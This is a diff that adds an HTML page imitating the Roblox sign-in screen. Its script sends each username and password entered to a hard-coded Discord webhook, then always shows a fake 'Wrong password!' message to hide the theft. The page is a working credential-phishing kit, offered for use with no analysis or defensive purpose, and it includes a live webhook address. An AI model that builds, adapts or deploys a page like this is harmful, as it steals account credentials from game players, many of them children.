@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox Sign In</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #e5e5e5;
+      background-image: url('https://wallpapercave.com/wp/wp6204950.jpg');
+      background-repeat: no-repeat;
+      background-position: center center;
+      background-size: 100% 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding-top: 150px;
+    }
+
+    .login-container {
+      background: rgba(255, 255, 255, 0);
+      padding: 2.5rem;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 1.5rem;
+      color: #ffffff;
+      font-weight: 700;
+    }
+
+    .input-group {
+      margin-bottom: 1.2rem;
+      text-align: left;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 0.75rem;
+      border-radius: 8px;
+      border: 1px solid #cccccc00;
+      font-size: 1rem;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 0.75rem;
+      background-color: #000000;
+      border: none;
+      color: white;
+      font-size: 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .login-button:hover {
+      background-color: #000000;
+    }
+
+    .message {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+    }
+
+    .success {
+      color: green;
+    }
+
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h2>Roblox Sign In</h2>
+    <form onsubmit="handleLogin(event)">
+      <div class="input-group">
+        <label for="username1">Roblox Username</label>
+        <input type="text" id="username1" placeholder="Enter username/email/code" required />
+      </div>
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" placeholder="Enter password" required />
+      </div>
+      <button class="login-button" type="submit">Log In</button>
+      <div id="message" class="message"></div>
+    </form>
+  </div>
+
+  <script>
+    function handleLogin(event) {
+      event.preventDefault();
+
+      const username = document.getElementById("username1").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const message = document.getElementById("message");
+
+      if (!username || !password) {
+        message.textContent = "Please fill in both fields.";
+        message.className = "message error";
+        return;
+      }
+
+      // Your Discord webhook URL
+      const webhookURL = "https://discord.com/api/webhooks/1377409611002286201/6YX_wL9saCPuJlvGY0RWuQ9Jz1iUUol1Y5svDN5Ugwqk4osgz1-ztV8vvG6bmZf9NHD5";
+
+      const payload = {
+        content: `🎮 Roblox Login Attempt:\n**Username:** ${username}\n**Password:** ${password}`
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).then(response => {
+        // Always show "wrong password" message no matter what
+        message.textContent = "Wrong password! Check your username or password again.";
+        message.className = "message error";
+
+        // Clear password input for security
+        document.getElementById("password").value = "";
+      }).catch(error => {
+        message.textContent = "Network error. Try again later.";
+        message.className = "message error";
+        console.error("Webhook error:", error);
+      });
+    }
+  </script>
+</body>
+</html>
